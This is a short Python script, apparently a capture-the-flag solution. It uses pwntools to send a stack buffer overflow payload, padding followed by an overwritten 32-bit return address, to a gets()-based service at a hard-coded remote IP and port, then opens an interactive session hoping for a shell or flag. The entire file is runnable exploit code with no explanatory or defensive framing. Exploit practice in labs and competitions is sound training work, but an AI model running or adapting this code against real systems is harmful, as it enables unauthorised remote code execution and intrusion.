#!/usr/bin/env python3
# exploit_pwntools.py - uses pwntools for nicer interaction
# Usage: python3 exploit_pwntools.py

from pwn import *

HOST = "49.213.52.6"
PORT = 9999

TARGET_ADDR = 0x080491f6   # update if different

BUF_SIZE = 40
SAVED_EBP = 4
OFFSET = BUF_SIZE + SAVED_EBP

context(os='linux', arch='i386', log_level='info')

def build_payload():
    return b"A" * OFFSET + p32(TARGET_ADDR)

def main():
    payload = build_payload()
    log.info(f"payload len={len(payload)} offset={OFFSET} return=0x{TARGET_ADDR:08x}")

    # remote connection
    p = remote(HOST, PORT, timeout=8)

    # show banner
    try:
        banner = p.recv(timeout=0.8)
        if banner:
            log.info("banner:\n" + banner.decode(errors='replace'))
    except EOFError:
        pass

    # send payload (gets() reads until newline)
    p.sendline(payload)

    # try to read everything; then drop to interactive
    try:
        out = p.recv(timeout=2)
        if out:
            log.info("response:\n" + out.decode(errors='replace'))
    except Exception:
        pass

    # interact (if the target function gives a shell or prints flag)
    p.interactive()

if __name__ == "__main__":
    main()
